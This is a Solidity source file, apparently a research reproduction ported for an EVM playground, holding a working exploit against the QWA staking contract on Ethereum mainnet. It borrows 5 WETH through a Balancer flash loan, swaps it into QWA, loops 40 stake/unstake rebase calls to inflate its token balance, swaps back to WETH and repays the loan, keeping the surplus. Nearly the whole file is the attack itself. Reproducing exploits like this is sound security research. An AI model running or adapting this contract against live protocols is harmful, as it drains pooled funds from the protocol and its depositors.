// SPDX-License-Identifier: UNLICENSED
// Cleaned for EVM Playground recorder (plain @ethereumjs/vm, no forge Test/cheats).
// State preloaded from anvil_state (Balancer Vault, Uniswap Router, WETH/QWA/sQWA
// pair, QWAStaking, sQWA all present). No cheatcodes used in the original
// attack path (only vm.createSelectFork in setUp, which is not part of the
// attack), so this is a near-direct port with Test/forge-std stripped.
pragma solidity ^0.8.10;

import "./../interface.sol";

interface IStaking {
    function unstake(address _to, uint256 _amount, bool _rebase) external;
    function stake(address _to, uint256 _amount) external;
}

contract Exploit {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 Fumog = IERC20(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065); // QWA
    IStaking QWAStaking = IStaking(0x69422c7F237D70FCd55C218568a67d00dc4ea068);
    IERC20 Sfumog = IERC20(0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC); // sQWA

    function testExploit() public {
        address[] memory token = new address[](1);
        token[0] = address(WETH);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 5 ether;
        // userData = 0x28 (40) -> 40 stake/unstake round-trips in the callback.
        balancer.flashLoan(address(this), token, amount, hex"28");
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(Fumog);
        Router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
        Fumog.approve(address(QWAStaking), type(uint256).max);
        Sfumog.approve(address(QWAStaking), type(uint256).max);

        uint8 i = 0;
        while (i < uint8(userData[0])) {
            i += 1;
            uint256 amountJump = Fumog.balanceOf(address(this));
            QWAStaking.stake(address(this), amountJump);
            uint256 amountSJump = Sfumog.balanceOf(address(this));
            QWAStaking.unstake(address(this), amountSJump, true);
        }

        Fumog.approve(address(Router), type(uint256).max);
        uint256 amount = Fumog.balanceOf(address(this));
        path[0] = address(Fumog);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        WETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }

    receive() external payable {}
}
